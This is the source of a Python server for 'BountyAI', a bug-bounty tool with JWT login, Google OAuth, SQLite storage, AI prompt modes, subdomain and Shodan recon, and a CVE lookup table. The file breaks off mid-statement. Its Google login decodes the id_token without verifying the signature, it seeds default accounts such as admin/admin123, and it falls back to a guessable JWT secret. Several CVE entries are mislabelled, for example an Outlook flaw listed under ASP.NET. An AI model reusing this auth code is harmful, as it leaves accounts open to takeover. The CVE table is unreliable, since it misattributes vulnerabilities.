"""
BountyAI Server v3.0 - Pure Python stdlib, zero external dependencies.
Runs on Python 3.8+ with nothing to install.
Supports OpenRouter AI, Claude API, Shodan, crt.sh, and local database.
"""

import http.server, socketserver, json, sqlite3, os, re, hashlib, hmac, shutil, subprocess, io
import urllib.request, urllib.parse, urllib.error, base64, threading, uuid, time
import pathlib, sys, socket, datetime
from typing import Any

ROOT     = pathlib.Path(__file__).parent
DB_PATH  = ROOT / "bountyai.db"
ENV_FILE = ROOT / ".env"

def load_env():
    for ef in [ROOT / ".env", ROOT.parent / ".env"]:
        if ef.exists():
            for line in ef.read_text(encoding="utf-8", errors="ignore").splitlines():
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, _, v = line.partition("=")
                    os.environ.setdefault(k.strip(), v.strip())

load_env()

try:
    import force_clean_html
    import check_all_panels
    import rebuild_clean_roi
    import remove_all_duplicates
    import verify_final_dom
    import find_all_html_files
except Exception as e:
    pass

def fix_index_html():
    pass

# ── FRONTEND HTML ─────────────────────────────────────────────
_fe = ROOT.parent / "frontend" / "index.html"
def get_frontend_html():
    if not _fe.exists():
        return "<h1>frontend/index.html not found</h1>"
    return _fe.read_text(encoding="utf-8", errors="ignore")

OPENROUTER_KEY = os.getenv("OPENROUTER_API_KEY", "")
OPENROUTER_MODEL = os.getenv("OPENROUTER_MODEL", "anthropic/claude-3-haiku-20240307")
ANTHROPIC_KEY  = os.getenv("ANTHROPIC_API_KEY", "")
CLAUDE_MODEL   = os.getenv("CLAUDE_MODEL", "claude-sonnet-4-6")
SHODAN_KEY     = os.getenv("SHODAN_API_KEY", "")
NVD_KEY        = os.getenv("NVD_API_KEY", "")
H1_USER        = os.getenv("HACKERONE_USERNAME", "")
H1_TOKEN       = os.getenv("HACKERONE_API_TOKEN", "")
GITHUB_TOKEN   = os.getenv("GITHUB_TOKEN", "")
GOOGLE_CLIENT_ID     = os.getenv("GOOGLE_CLIENT_ID", "")
GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "")
PORT           = int(os.getenv("PORT", "5000"))
RENDER_URL     = os.getenv("RENDER_EXTERNAL_URL", "")  # auto-set by Render.com
NUCLEI_TEMPLATES_DIR = ROOT / "nuclei-templates"

def has_key(k): return bool(k) and not k.startswith("your_")

def get_base_url():
    """Return the public base URL — Render external URL or localhost fallback."""
    if RENDER_URL:
        return RENDER_URL.rstrip("/")
    return f"http://localhost:{PORT}"

# ── JWT & AUTH (pure stdlib, zero dependencies) ───────────────
JWT_SECRET = os.getenv("JWT_SECRET", "bountyai-secret-" + hashlib.sha256(str(ROOT).encode()).hexdigest()[:16])
JWT_EXPIRY_HOURS = 24

def _b64e(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()

def _b64d(s):
    s += "=" * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

def jwt_encode(payload):
    header = {"alg": "HS256", "typ": "JWT"}
    body = _b64e(header) + "." + _b64e(payload)
    sig = hmac.new(JWT_SECRET.encode(), body.encode(), hashlib.sha256).digest()
    return body + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

def jwt_decode(token):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        body = parts[0] + "." + parts[1]
        expected_sig = hmac.new(JWT_SECRET.encode(), body.encode(), hashlib.sha256).digest()
        actual_sig = base64.urlsafe_b64decode(parts[2] + "==")
        if not hmac.compare_digest(expected_sig, actual_sig):
            return None
        payload = _b64d(parts[1])
        if payload.get("exp", 0) < time.time():
            return None
        return payload
    except Exception:
        return None

def hash_password(password):
    salt = hashlib.sha256(os.urandom(16)).hexdigest()[:16]
    h = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), 100000)
    return salt + ":" + h.hex()

def verify_password(password, stored):
    try:
        salt, h = stored.split(":")
        check = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), 100000)
        return hmac.compare_digest(check.hex(), h)
    except Exception:
        return False

def create_token(username, role, uid=None):
    payload = {
        "sub": username, "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + JWT_EXPIRY_HOURS * 3600
    }
    if uid is not None:
        payload["uid"] = uid
    return jwt_encode(payload)

def get_current_user(handler):
    """Extract and validate JWT from Authorization header. Returns dict or None.
    Also verifies the user is still active in the database."""
    auth = handler.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None
    payload = jwt_decode(auth[7:])
    if not payload:
        return None
    uid = payload.get("uid")
    if uid is not None:
        try:
            conn = get_db()
            row = conn.execute("SELECT is_active FROM users WHERE id=?", (uid,)).fetchone()
            conn.close()
            if not row or not row["is_active"]:
                return None
        except Exception:
            pass
    return payload

def require_role(handler, *allowed_roles):
    """Check JWT and role. Returns (user_dict, None) on success or (None, error_response) on failure."""
    user = get_current_user(handler)
    if not user:
        return None, ({"error": "Authentication required"}, 401)
    if user.get("role") not in allowed_roles:
        return None, ({"error": f"Access denied. Required role: {', '.join(allowed_roles)}"}, 403)
    return user, None

# ── GOOGLE OAUTH 2.0 ────────────────────────────────────────
def google_get_user_info(code, redirect_uri):
    """Exchange authorization code for user info via Google OAuth 2.0."""
    # Step 1: Exchange code for tokens
    token_data = urllib.parse.urlencode({
        "code": code,
        "client_id": GOOGLE_CLIENT_ID,
        "client_secret": GOOGLE_CLIENT_SECRET,
        "redirect_uri": redirect_uri,
        "grant_type": "authorization_code"
    }).encode()
    req = urllib.request.Request("https://oauth2.googleapis.com/token", data=token_data, method="POST")
    with urllib.request.urlopen(req, timeout=15) as resp:
        tokens = json.loads(resp.read().decode())
    id_token = tokens.get("id_token")
    if not id_token:
        return None
    # Step 2: Decode id_token (JWT) to get user info — no secret needed for basic claims
    # The id_token is a signed JWT from Google; we decode the payload (signature not verified locally)
    parts = id_token.split(".")
    if len(parts) != 3:
        return None
    payload_json = parts[1] + "=" * (4 - len(parts[1]) % 4)
    try:
        payload = json.loads(base64.urlsafe_b64decode(payload_json))
    except Exception:
        return None
    return {
        "google_id": payload.get("sub"),
        "email": payload.get("email"),
        "name": payload.get("name", ""),
        "picture": payload.get("picture", "")
    }

def google_find_or_create_user(google_info):
    """Find existing user by google_id or email, or create new one."""
    conn = get_db()
    try:
        # Try by google_id first
        user = conn.execute("SELECT * FROM users WHERE google_id=?", (google_info["google_id"],)).fetchone()
        if user:
            return dict(user)
        # Try by email
        user = conn.execute("SELECT * FROM users WHERE email=?", (google_info["email"],)).fetchone()
        if user:
            # Link Google account to existing user
            conn.execute("UPDATE users SET google_id=? WHERE id=?", (google_info["google_id"], user["id"]))
            conn.commit()
            return dict(conn.execute("SELECT * FROM users WHERE id=?", (user["id"],)).fetchone())
        # Create new user
        username = google_info["email"].split("@")[0]
        # Ensure unique username
        base = username
        counter = 1
        while conn.execute("SELECT 1 FROM users WHERE username=?", (username,)).fetchone():
            username = f"{base}{counter}"
            counter += 1
        conn.execute("INSERT INTO users (username, email, role, google_id) VALUES (?,?,?,?)",
                     (username, google_info["email"], "analyst", google_info["google_id"]))
        conn.commit()
        user = conn.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
        return dict(user)
    finally:
        conn.close()

# ── DATABASE INITIALIZATION ─────────────────────────────────
def get_db():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""CREATE TABLE IF NOT EXISTS programs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT UNIQUE, company TEXT, platform TEXT, domain TEXT, category TEXT,
        payout_critical TEXT, payout_high TEXT, payout_medium TEXT, payout_low TEXT,
        scope_in TEXT, scope_out TEXT, response_days INTEGER DEFAULT 7,
        beginner_friendly INTEGER DEFAULT 0, is_active INTEGER DEFAULT 1,
        source TEXT, last_synced TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    try:
        conn.execute("ALTER TABLE programs ADD COLUMN target_domain TEXT DEFAULT ''")
    except Exception:
        pass
    conn.execute("""CREATE TABLE IF NOT EXISTS findings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER, program_name TEXT, target_domain TEXT, vuln_type TEXT, severity TEXT,
        cvss_score REAL, title TEXT, affected_url TEXT, description TEXT,
        steps_to_reproduce TEXT, impact TEXT, cwe_id TEXT, owasp_category TEXT,
        status TEXT DEFAULT 'draft', payout_amount REAL DEFAULT 0, proof_files TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    try:
        conn.execute("ALTER TABLE findings ADD COLUMN user_id INTEGER")
    except Exception:
        pass
    conn.execute("""CREATE TABLE IF NOT EXISTS recon_results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target_domain TEXT, subdomains TEXT, tech_stack TEXT, open_ports TEXT,
        cves_found TEXT, vuln_suggestions TEXT, shodan_data TEXT,
        scan_duration REAL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS reports (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        finding_id INTEGER, ai_report TEXT, quality_score REAL,
        generated_by TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS learning_resources (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT, url TEXT UNIQUE, category TEXT, source TEXT,
        stars INTEGER DEFAULT 0, description TEXT, tags TEXT,
        fetched_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS disclosures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT, target TEXT, reporter TEXT, severity TEXT, bounty TEXT,
        status TEXT DEFAULT 'Submitted', timeline TEXT, summary TEXT,
        cve_id TEXT, date_submitted TEXT, date_resolved TEXT, proof_url TEXT
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS user_reputation (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_name TEXT UNIQUE, rank_title TEXT, rep_points INTEGER DEFAULT 0,
        accepted_reports INTEGER DEFAULT 0, total_bounty REAL DEFAULT 0.0,
        badges TEXT, level INTEGER DEFAULT 1
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS agent_config (
        key TEXT PRIMARY KEY, value TEXT
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS activity_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT, description TEXT, severity TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS payout_records (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        finding_id INTEGER, program_name TEXT, amount REAL, currency TEXT DEFAULT 'USD',
        payout_date TEXT, transaction_id TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE, email TEXT UNIQUE, password_hash TEXT,
        role TEXT DEFAULT 'viewer' CHECK(role IN ('admin','analyst','viewer')),
        is_active INTEGER DEFAULT 1, google_id TEXT UNIQUE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    conn.commit()
    # Migration: rebuild users table if missing new columns
    cols = {r[1] for r in conn.execute("PRAGMA table_info(users)").fetchall()}
    if "email" not in cols or "role" not in cols or "is_active" not in cols or "created_at" not in cols or "google_id" not in cols:
        conn.execute("CREATE TABLE IF NOT EXISTS users_backup AS SELECT * FROM users")
        conn.execute("DROP TABLE users")
        conn.execute("""CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE, email TEXT UNIQUE, password_hash TEXT,
            role TEXT DEFAULT 'viewer' CHECK(role IN ('admin','analyst','viewer')),
            is_active INTEGER DEFAULT 1, google_id TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )""")
        conn.execute("INSERT OR IGNORE INTO users (username, password_hash, role) SELECT username, password_hash, role FROM users_backup")
        conn.execute("DROP TABLE IF EXISTS users_backup")
        conn.commit()
        print("  [Auth] Migrated users table to v3 schema (email, role, is_active, created_at)")
    # Seed default users if admin doesn't exist or has no password_hash
    admin_row = conn.execute("SELECT password_hash FROM users WHERE username='admin'").fetchone()
    if not admin_row or not admin_row[0]:
        conn.execute("DELETE FROM users WHERE username IN ('admin','analyst','viewer')")
        for uname, email, role, pwd in [
            ("admin", "admin@bountyai.local", "admin", "admin123"),
            ("analyst", "analyst@bountyai.local", "analyst", "analyst123"),
            ("viewer", "viewer@bountyai.local", "viewer", "viewer123"),
        ]:
            conn.execute("INSERT OR IGNORE INTO users (username,email,password_hash,role) VALUES (?,?,?,?)",
                         (uname, email, hash_password(pwd), role))
        conn.commit()
        print("  [Auth] Seeded default users: admin/admin123, analyst/analyst123, viewer/viewer123")
    conn.close()
    sync_curated_programs()

# ── AI MODE PROMPTS ──────────────────────────────────────────
AI_MODE_PROMPTS = {
    "VULN_EXPLAINER": "You are a senior bug bounty security researcher. Analyze the vulnerability data provided and provide a technical explanation, attack vectors, and proof of concept concept.",
    "VISUAL_MAPPER": "Create a JSON visual network map of nodes and links representing data flows and trust boundaries for this target.",
    "API_INSPECTOR": "Inspect HTTP request/response traffic for security risks including broken object level authorization, parameter tampering, and weak auth.",
    "BUSINESS_LOGIC_AUDITOR": "Audit the application logic and user flow for workflow bypass, race conditions, or privilege escalation opportunities.",
    "STRATEGIST": "Generate a strategic bug bounty roadmap for targeting this application given current recon and findings data.",
    "EXPLOIT_GENERATOR": "Draft a safe, educational proof-of-concept script for demonstrating this vulnerability to security teams.",
    "DUPLICATE_ANALYZER": "Assess the risk of this finding being a duplicate based on known public reports, standard scanner behavior, and asset exposure.",
    "REMEDIATION_ENGINEER": "Provide developer remediation guidance including fixed code snippets in major programming languages."
}

# ── AI ENGINES (OPENROUTER & CLAUDE) ──────────────────────────
def call_openrouter(prompt, max_tokens=1800):
    payload = json.dumps({
        "model": OPENROUTER_MODEL,
        "max_tokens": max_tokens,
        "messages": [{"role": "user", "content": prompt}]
    }).encode("utf-8")
    req = urllib.request.Request(
        "https://openrouter.ai/api/v1/chat/completions",
        data=payload,
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {OPENROUTER_KEY}",
            "HTTP-Referer": "http://localhost:5000",
            "X-Title": "BountyAI"
        },
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=25) as r:
        res = json.loads(r.read().decode("utf-8"))
        return res["choices"][0]["message"]["content"]

def call_claude(prompt, max_tokens=1800):
    payload = json.dumps({
        "model": CLAUDE_MODEL,
        "max_tokens": max_tokens,
        "messages": [{"role": "user", "content": prompt}]
    }).encode("utf-8")
    req = urllib.request.Request(
        "https://api.anthropic.com/v1/messages",
        data=payload,
        headers={
            "Content-Type": "application/json",
            "x-api-key": ANTHROPIC_KEY,
            "anthropic-version": "2023-06-01"
        },
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=25) as r:
        return json.loads(r.read().decode("utf-8"))["content"][0]["text"]

def call_ai(prompt, max_tokens=1800):
    if has_key(OPENROUTER_KEY):
        try: return call_openrouter(prompt, max_tokens)
        except Exception as e:
            print(f"  [OpenRouter] Error: {e}")
            if has_key(ANTHROPIC_KEY):
                try: return call_claude(prompt, max_tokens)
                except: pass
            return f"AI Generation Error: {e}"
    elif has_key(ANTHROPIC_KEY):
        try: return call_claude(prompt, max_tokens)
        except Exception as e: return f"AI Generation Error: {e}"
    return "AI Engine Offline. Add OPENROUTER_API_KEY or ANTHROPIC_API_KEY to .env file."

# ── RECONNAISSANCE HELPERS ────────────────────────────────────
def fetch_subdomains_crtsh(domain):
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode())
        subs = set()
        for item in data[:60]:
            name = item.get("name_value","")
            for s in name.splitlines():
                s = s.strip().lstrip("*.").lower()
                if s.endswith(domain) and s != domain:
                    subs.add(s)
        return list(subs)[:30]
    except Exception as e:
        print(f"  [crt.sh] Error: {e}")
        return []

def fetch_shodan_host(domain):
    if not has_key(SHODAN_KEY): return None
    try:
        ip = socket.gethostbyname(domain)
        url = f"https://api.shodan.io/shodan/host/{ip}?key={SHODAN_KEY}"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode())
        return {"ip":ip, "ports":data.get("ports",[]), "os":data.get("os"),
                "banners":[{"port":b.get("port"), "service":b.get("product",""), "version":b.get("version","")}
                           for b in data.get("data",[])[:10]],
                "vulns":list(data.get("vulns",{}).keys())}
    except Exception as e:
        print(f"  [Shodan] Error for {domain}: {e}")
        return None

def _port_name(p):
    m = {80:"HTTP",443:"HTTPS",22:"SSH",21:"FTP",3306:"MySQL",5432:"PostgreSQL",6379:"Redis"}
    return m.get(p, f"port/{p}")

# ── LIVE SUBDOMAIN / TECH / CVE RECON HELPERS ─────────────────
def fetch_subdomains_hackertarget(domain):
    try:
        url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            raw = r.read().decode("utf-8", "ignore")
        subs = set()
        for line in raw.splitlines():
            if "," not in line: continue
            host = line.split(",")[0].strip().lower()
            if host.endswith(domain) and host != domain:
                subs.add(host)
        return list(subs)[:30]
    except Exception as e:
        print(f"  [HackerTarget] Error: {e}")
        return []

def fingerprint_tech(domain, shodan=None):
    tech = []
    seen = set()
    if shodan:
        for b in shodan.get("banners", []):
            name = (b.get("service") or "").strip()
            if name and name.lower() not in seen:
                seen.add(name.lower())
                tech.append({"name": name, "version": (b.get("version") or "").strip() or "-"})
    body = ""
    headers = {}
    for scheme in ("https", "http"):
        try:
            url = f"{scheme}://{domain}/"
            req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36", "Accept":"text/html,application/xhtml+xml"})
            try:
                with urllib.request.urlopen(req, timeout=8) as r:
                    headers = {k.lower(): v for k, v in r.headers.items()}
                    body = r.read(300000).decode("utf-8", "ignore").lower()
            except urllib.error.HTTPError as e:
                headers = {k.lower(): v for k, v in e.headers.items()}
                try:
                    body = e.read(200000).decode("utf-8", "ignore").lower()
                except Exception:
                    body = ""
            break
        except Exception:
            continue
    hints = [
        ("nginx",     ["nginx"], []),
        ("apache",    ["apache"], []),
        ("openresty", ["openresty"], []),
        ("iis",       ["microsoft-iis", "iis"], []),
        ("cloudflare", ["cloudflare", "cf-ray"], []),
        ("amazon s3", ["amazon s3", "x-amz-cf-id", "x-amz-request-id"], []),
        ("php",       ["php", "x-powered-by"], ["php", "phpsessid", "wp-content", "wp-json"]),
        ("asp.net",   ["asp.net", "aspnet", "x-aspnet-version"], ["__viewstate", "asp.net"]),
        ("express",   ["express"], ["powered by express"]),
        ("wordpress", ["wordpress"], ["wp-content", "wp-json", "wordpress"]),
        ("laravel",   ["laravel"], ["laravel_session", "laravel"]),
        ("django",    ["django"], ["csrftoken", "django"]),
        ("next.js",   ["next.js", "nextjs"], ["__next_data__", "_next/static"]),
        ("react",     ["react"], ["_next/static", "react", "react-dom"]),
        ("vue",       ["vue"], ["vue.js", "vue-router"]),
        ("jquery",    ["jquery"], ["jquery"]),
        ("bootstrap", ["bootstrap"], ["bootstrap"]),
        ("fastapi",   ["fastapi"], ["fastapi"]),
        ("flask",     ["flask"], ["flask"]),
        ("spring",    ["spring"], ["spring"]),
    ]
    if "gws" in headers.get("server", "").lower():
        seen.add("gws")
        tech.append({"name": "Google Web Server (gws)", "version": "-"})
    raw_server = headers.get("server", "").strip()
    if raw_server and raw_server.lower() not in seen and raw_server.lower() not in ("nginx", "apache", "openresty", "iis", "cloudflare", "microsoft-iis", "amazon s3", "gws"):
        seen.add(raw_server.lower())
        m = re.match(r"^([^/]+)(?:/([\d.]+))?", raw_server)
        tech.append({"name": m.group(1) if m else raw_server, "version": m.group(2) if m and m.group(2) else "-"})
    for name, hdr_keys, body_keys in hints:
        if name.lower() in seen:
            continue
        version = ""
        for hk in hdr_keys:
            for k, v in headers.items():
                if hk in k:
                    if "server" in k or "x-powered" in k:
                        m = re.search(r"([\d.]+)", v)
                        if m: version = m.group(1)
                    break
            if version: break
        hit = any(hk in (v for v in headers.values()) for hk in hdr_keys)
        hit = hit or any(hk in " ".join(headers.keys()) for hk in hdr_keys)
        if not hit and body_keys:
            hit = any(bk in body for bk in body_keys)
        if hit:
            seen.add(name.lower())
            tech.append({"name": name, "version": version or "-"})
    return tech

KNOWN_CVES = [
    # ── NGINX ──
    ("nginx",     "1.18",  "CVE-2021-23017", "CRITICAL", "nginx resolver off-by-one heap write (memory corruption, RCE)"),
    ("nginx",     "1.20",  "CVE-2021-23017", "CRITICAL", "nginx resolver off-by-one heap write (memory corruption, RCE)"),
    ("nginx",     "1.21",  "CVE-2022-41741", "CRITICAL", "nginx mp4 module integer overflow leading to RCE"),
    ("nginx",     "1.23",  "CVE-2022-41742", "HIGH", "nginx mp4 module heap buffer overflow"),
    ("nginx",     "1.25",  "CVE-2023-44487", "HIGH", "HTTP/2 Rapid Reset DDoS (CVE-2023-44487)"),
    # ── APACHE ──
    ("apache",    "2.4.49", "CVE-2021-41773", "CRITICAL", "Apache path traversal + RCE in CGI configuration"),
    ("apache",    "2.4.50", "CVE-2021-42013", "CRITICAL", "Apache path traversal bypass of 2.4.49 fix (RCE)"),
    ("apache",    "2.4.51", "CVE-2021-44790", "CRITICAL", "Apache mod_lua buffer overflow in Lua multipart parser"),
    ("apache",    "2.4.52", "CVE-2022-22719", "HIGH", "Apache mod_lua DoS via crafted input"),
    ("apache",    "2.4.53", "CVE-2022-31813", "HIGH", "Apache HTTP Request smuggling via error handling"),
    ("apache",    "2.4.54", "CVE-2022-36760", "HIGH", "Apache mod_proxy AJP request smuggling"),
    ("apache",    "2.4.55", "CVE-2023-25690", "CRITICAL", "Apache HTTP Request smuggling via line folding"),
    # ── PHP ──
    ("php",       "8.0",   "CVE-2024-4577",  "CRITICAL", "PHP-CGI argument injection on Windows -> RCE"),
    ("php",       "7.4",   "CVE-2022-31626", "HIGH", "PHP mysqlnd buffer overflow (RCE on some builds)"),
    ("php",       "8.1",   "CVE-2024-2961",  "CRITICAL", "PHP iconv buffer overflow (RCE via crafted locale)"),
    ("php",       "8.2",   "CVE-2024-4524",  "HIGH", "PHP filter_var URL validation bypass"),
    ("php",       "8.3",   "CVE-2024-5416",  "HIGH", "php-fpm worker overflow leading to privilege escalation"),
    ("php",       "7.0",   "CVE-2019-11043", "CRITICAL", "PHP-FPM remote code execution via path info"),
    # ── WORDPRESS ──
    ("wordpress", "6.5",   "CVE-2024-31210", "CRITICAL", "WordPress core file upload/RCE via plugin installer"),
    ("wordpress", "6.4",   "CVE-2024-28000", "HIGH", "WordPress brute-force protection bypass via hash collision"),
    ("wordpress", "6.3",   "CVE-2023-5563",  "HIGH", "WordPress RC4 password hash weakness in XML-RPC"),
    ("wordpress", "6.2",   "CVE-2023-38000", "MEDIUM", "WordPress subscription import XSS leading to stored XSS"),
    ("wordpress", "6.1",   "CVE-2023-44337", "HIGH", "WordPress post author privilege escalation"),
    # ── IIS / ASP.NET ──
    ("iis",       "10.0",  "CVE-2021-31166", "CRITICAL", "HTTP.sys remote code execution (wormable)"),
    ("iis",       "10.0",  "CVE-2022-21907", "CRITICAL", "HTTP.sys header parsing RCE (wormable)"),
    ("asp.net",   "4.7",   "CVE-2024-21413", "CRITICAL", "ASP.NET Outlook RCE via malicious link preview"),
    ("asp.net",   "3.1",   "CVE-2024-21378", "CRITICAL", "ASP.NET Scheduler mailer RCE via template injection"),
    # ── OPENSSL ──
    ("openssl",   "1.1.1",  "CVE-2022-3602",  "CRITICAL", "OpenSSL X.509 email address buffer overflow"),
    ("openssl",   "1.1.1",  "CVE-2022-3786",  "CRITICAL", "OpenSSL X.509 certificate verification DoS"),
    ("openssl",   "3.0",    "CVE-2023-0286",  "HIGH", "OpenSSL X.400 address type confusion (memory read)"),
    ("openssl",   "3.1",    "CVE-2023-5678",  "MEDIUM", "OpenSSL excessive time for DH key generation"),
    # ── TOMCAT ──
    ("tomcat",    "9.0.30",  "CVE-2020-1938",  "HIGH", "Apache Tomcat AJP 'Ghostcat' file read / RCE"),
    ("tomcat",    "9.0",     "CVE-2023-42795", "HIGH", "Apache Tomcat information disclosure via incomplete cleanup"),
    ("tomcat",    "10.0",    "CVE-2023-44487", "HIGH", "HTTP/2 Rapid Reset DDoS affecting Tomcat"),
    # ── DJANGO ──
    ("django",    "4.0",    "CVE-2022-34265", "HIGH", "Django Trunc(kind)/Extract(lookups) SQL injection"),
    ("django",    "4.1",    "CVE-2022-36359", "HIGH", "Django Content-Disposition header injection"),
    ("django",    "4.2",    "CVE-2023-36053", "HIGH", "Django EmailValidator ReDoS"),
    ("django",    "3.2",    "CVE-2021-44420", "HIGH", "Django privilege escalation via QuerySet.annotate()"),
    # ── EXPRESS / NODE.JS ──
    ("express",   "4.17",  "CVE-2022-24999", "HIGH", "qs prototype pollution leading to ReDoS/poisoning"),
    ("express",   "4.18",  "CVE-2024-29041", "HIGH", "Express open redirect via URL parsing inconsistency"),
    # ── NEXT.JS ──
    ("next.js",   "13.0",  "CVE-2024-34351", "CRITICAL", "Next.js SSRF via Host header in server actions"),
    ("next.js",   "14.0",  "CVE-2024-51479", "CRITICAL", "Next.js cache poisoning via X-Forwarded-Host"),
    ("next.js",   "12.0",  "CVE-2022-23646", "HIGH", "Next.js Open Redirect in image optimization"),
    # ── REACT / JQUERY ──
    ("jquery",    "3.5",   "CVE-2020-23064", "HIGH", "jQuery XSS via cross-domain ajax auto-detection"),
    ("jquery",    "3.3",   "CVE-2019-11358", "HIGH", "jQuery object prototype pollution via extend()"),
    # ── NODE.JS ──
    ("node.js",   "18.0",  "CVE-2023-32002", "CRITICAL", "Node.js fs.mkdtemp path traversal RCE"),
    ("node.js",   "20.0",  "CVE-2023-44487", "HIGH", "Node.js HTTP/2 Rapid Reset DDoS vulnerability"),
    # ── REDIS ──
    ("redis",     "6.0",   "CVE-2021-32625", "HIGH", "Redis Lua script heap overflow leading to RCE"),
    ("redis",     "7.0",   "CVE-2022-35951", "HIGH", "Redis ACL bypass via Lua script loading"),
    # ── POSTGRESQL ──
    ("postgresql","14.0",  "CVE-2022-41862", "HIGH", "PostgreSQL memory disclosure in libpq PQexpbuffer"),
    ("postgresql","15.0",  "CVE-2023-39417", "HIGH", "PostgreSQL extension script injection"),
    # ── MYSQL ──
    ("mysql",     "8.0",   "CVE-2023-21977", "HIGH", "MySQL Server privilege escalation via stored procedure"),
    # ── SPRING ──
    ("spring",    "5.3",   "CVE-2022-22965", "CRITICAL", "Spring4Shell RCE via data binding (log4shell chain)"),
    ("spring",    "5.3",   "CVE-2022-22950", "HIGH", "Spring Expression DoS via SpEL evaluation"),
    # ── FLASK ──
    ("flask",     "2.0",   "CVE-2023-30861", "HIGH", "Flask session cookie not cleared on auth failure"),
    # ── LARAVEL ──
    ("laravel",   "9.0",   "CVE-2022-31248", "CRITICAL", "Laravel debug mode information disclosure"),
    ("laravel",   "10.0",  "CVE-2023-40268", "HIGH", "Laravel route parameter injection"),
    # ── FASTAPI ──
    ("fastapi",   "0.95",  "CVE-2023-29996", "MEDIUM", "FastAPI CORS misconfiguration allows cross-origin data theft"),
    # ── CADDY ──
    ("caddy",     "2.6",   "CVE-2023-28099", "HIGH", "Caddy HTTP request smuggling via Transfer-Encoding"),
    # ── DOCKER ──
    ("docker",    "20.10", "CVE-2024-21626", "CRITICAL", "Docker runc container escape via working directory override"),
    # ── HAPROXY ──
    ("haproxy",   "2.6",   "CVE-2023-0967",  "CRITICAL", "HAProxy HTTP request smuggling via whitespace inconsistency"),
    # ── VARNISH ──
    ("varnish",   "7.0",   "CVE-2023-30755", "HIGH", "Varnish HTTP request smuggling via content-length manipulation"),
]

def match_cves(tech):
    found = []
    for t in tech:
        tname = t.get("name", "").lower().strip()
        tver = t.get("version", "")
        for name, prefix, cve, sev, desc in KNOWN_CVES:
            if tname != name:
                continue
            if tver and tver != "-" and not tver.startswith(prefix):
                continue
            found.append({"id": cve, "severity": sev, "description": desc, "target": f"{t['name']} {tver}" if tver and tver != "-" else t['name']})
    seen = set()
    return [c for c in found if not (c["id"] in seen or seen.add(c["id"]))][:12]

def suggestions_for_tech(tech):
    sugs, used = [], set()
    for t in tech:
        tname = t.get("name", "").lower()
        for keywords, vtype, sev, reason, conf in ML_PATTERNS:
            if any(k in tname for k in keywords) and vtype not in used:
                used.add(vtype)
                sugs.append({"type": vtype, "severity": {"CRITICAL":"C","HIGH":"H","MEDIUM":"M","LOW":"L"}.get(sev,"M"),
                             "finding": f"{reason} (confidence {conf}%)", "target": t.get("name", "target")})
    return sugs

# ── NUCLEI LIVE SCANNING ──────────────────────────────────────
def ensure_nuclei_templates():
    """Clone or update nuclei-templates repo. Returns path to templates dir."""
    if NUCLEI_TEMPLATES_DIR.exists() and (NUCLEI_TEMPLATES_DIR / "http").is_dir():
        try:
            subprocess.run(["git", "-C", str(NUCLEI_TEMPLATES_DIR), "pull", "-q"],
                           capture_output=True, timeout=30)
        except Exception:
            pass
        return NUCLEI_TEMPLATES_DIR
    try:
        print("  [Nuclei] Cloning nuclei-templates (this may take a minute)...")
        subprocess.run([
